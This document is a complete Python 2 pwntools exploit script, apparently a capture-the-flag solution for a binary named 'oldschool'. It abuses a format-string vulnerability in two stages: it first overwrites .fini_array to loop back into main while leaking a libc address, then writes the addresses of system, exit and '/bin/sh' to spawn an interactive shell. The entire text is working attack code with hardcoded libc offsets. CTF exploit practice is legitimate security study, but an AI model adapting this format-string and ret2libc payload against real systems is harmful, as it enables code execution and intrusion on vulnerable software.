#!/usr/bin/python2 -u
#

from pwn import *
from struct import pack
from time import sleep

fini_array = 0x080496dc  # fixed address (not a pie executable)
offset_main  = 0x849b

# offsets depending on libc version

# for custom gentoo libc
#offset_system_to_leak = -0x15eb90
#offset_binsh_to_system = 0x12061a
#offset_exit_to_system = -0xcfb0
#env = {}

# for libc provided by CTF
offset_system_to_leak = -0x17c480
offset_binsh_to_system = 0x12449b
offset_exit_to_system = -0xc4e0
env = {"LD_LIBRARY_PATH": os.getcwd()}

exploited = False
while not exploited:

    p = process("./oldschool", env=env)
    
    payload  = pack("<I", fini_array)              # ptr to __do_global_dtors_aux
    payload += "%" + str(offset_main) + "c%7$hn"   # set ptr rather to main+4 ;)
    payload += "%08x"                              # leak an address

    log.info("stage1 payload = " + repr(payload))
    with log.progress("rewriting .fini_array and leaking address") as logp:
        p.sendline(payload)
        logp.status("payload sent, waiting for response...")
        sleep(1)
        try:
            addr_leak = int(p.recvline(timeout=1)[-8:], 16)
        except:
            logp.failure("stdio pipe failed. trying again...")
            p.close()
            continue
        logp.success(hex(addr_leak))

    addr_system = (addr_leak | (0xf << 28)) + offset_system_to_leak
    addr_binsh = addr_system + offset_binsh_to_system
    addr_exit = addr_system + offset_exit_to_system

    log.info("libc system is at " + hex(addr_system) +
             ", '/bin/sh' string is at " + hex(addr_binsh))

    #raw_input('attach debugger')

    # payload calculation
    n = 3 # num of words to inject
    c_total = 0
    c_system_hi = ((addr_system >> 16) - c_total - 8*n) % 0xffff
    c_total += c_system_hi
    c_system_lo = ((addr_system & 0xffff) - c_total - (8*n-1)) % 0xffff
    c_total += c_system_lo
    c_exit_hi = ((addr_exit >> 16) - c_total - (8*n-1)) % 0xffff
    c_total += c_exit_hi
    c_exit_lo = ((addr_exit & 0xffff) - c_total - (8*n-2)) % 0xffff
    c_total += c_exit_lo
    c_binsh_hi = ((addr_binsh >> 16) - c_total - (8*n-2)) % 0xffff
    c_total += c_binsh_hi
    c_binsh_lo = ((addr_binsh & 0xffff) - c_total - (8*n-3)) % 0xffff
    c_total += c_binsh_lo
    payload2  = pack("<I", fini_array-2) # ret ptr changed to 0x80496d8
    payload2 += pack("<I", fini_array-4)
    payload2 += pack("<I", fini_array+2) # put addr to exit() here (graceful termination :)
    payload2 += pack("<I", fini_array)
    payload2 += pack("<I", fini_array+6) # put arg to system() here
    payload2 += pack("<I", fini_array+4)
    payload2 += "%" + str(c_system_hi) + "c%7$hn"
    payload2 += "%" + str(c_system_lo) + "c%8$hn"
    payload2 += "%" + str(c_exit_hi) + "c%9$hn"
    payload2 += "%" + str(c_exit_lo) + "c%10$hn"
    payload2 += "%" + str(c_binsh_hi) + "c%11$hn"
    payload2 += "%" + str(c_binsh_lo) + "c%12$hn"

    log.info("stage2 payload2 = " + repr(payload2))

    #raw_input('attach debugger')

    with log.progress("rewriting ptr in (shifted) .fini_array to ret2libc payload") as logp:
        logp.status("sending payload and trying to get forked child stdio immediately....")
        p.sendline(payload2)
        junk = p.recvn(c_total + 36, timeout=1)
        sleep(1)
        if len(junk) < c_total:
            logp.failure("stdio pipe failed. trying again...")
            p.close()
            continue
        logp.success("shell should gained!")
    
    p.interactive()
    exploited = True
    
p.close()
